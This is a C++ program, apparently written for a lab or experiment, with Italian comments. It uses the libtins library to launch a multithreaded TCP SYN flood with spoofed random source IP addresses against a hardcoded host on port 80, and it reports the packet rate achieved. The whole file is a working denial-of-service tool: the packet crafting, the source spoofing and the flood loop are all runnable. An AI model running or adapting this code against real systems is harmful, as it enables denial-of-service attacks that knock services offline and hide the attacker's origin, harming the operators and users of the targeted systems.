#include <tins/tins.h>
#include <iostream>
#include <sstream>
#include <thread>

using namespace Tins;

uint16_t random_ip_part(){
    return rand() % 253 + 1;
}

void init_random(){
    unsigned seed = time(nullptr);
    srand(seed);
}

IPv4Address random_ip_address(){
    std::stringstream buff;
    buff << random_ip_part() << '.' << random_ip_part() << '.' << random_ip_part() << '.' << random_ip_part();
    return buff.str();
}

void syn_flood(const IPv4Address& dst_ip, uint16_t dst_port, unsigned counter){
    NetworkInterface interface = NetworkInterface::default_interface();
    PacketSender sender;
    init_random();
    EthernetII eth = EthernetII() / IP(dst_ip, random_ip_address()) / TCP(dst_port, rand() % 65535);
    IP *ip = eth.find_pdu<IP>();
    TCP *tcp = eth.find_pdu<TCP>();
    tcp->set_flag(TCP::SYN, 1);

    for(int i=0; i<counter; i++){
        // per ogni syn inviato cambio l'indirizzo ip sorgente
        ip->src_addr(random_ip_address());

        // per ogni syn inviato cambio scelgo un numero random
        // per la grandezza della finestra di trasmissione e
        // la porta in uscita
//        tcp->window(1000 + rand() % 65535);
        tcp->sport(rand() % 65535);
        tcp->seq((rand()%65536)*(rand()%65536));

        // mando il pacchetto
        sender.send(eth, interface);
    }
}

int main(int argc, char* argv[]) {
    IPv4Address dst("192.168.1.24");
    uint16_t dst_port = 80;
    unsigned counter = 1000000;
    unsigned threads_number = 4;
    std::vector<std::thread> threads;
    threads.reserve(threads_number);

    auto start = std::chrono::steady_clock::now();
    for(int i=0; i<threads_number; i++){
        threads.emplace_back(syn_flood, dst, dst_port, counter);
    }
    for(std::thread &t: threads){
        t.join();
    }
    auto end = std::chrono::steady_clock::now();
    std::chrono::duration<double> elapsed_seconds = end-start;
    std::cout << "elapsed time: " << elapsed_seconds.count() << std::endl;
    std::cout << "pps: " << threads_number * counter/elapsed_seconds.count() << "p/s" << std::endl;

}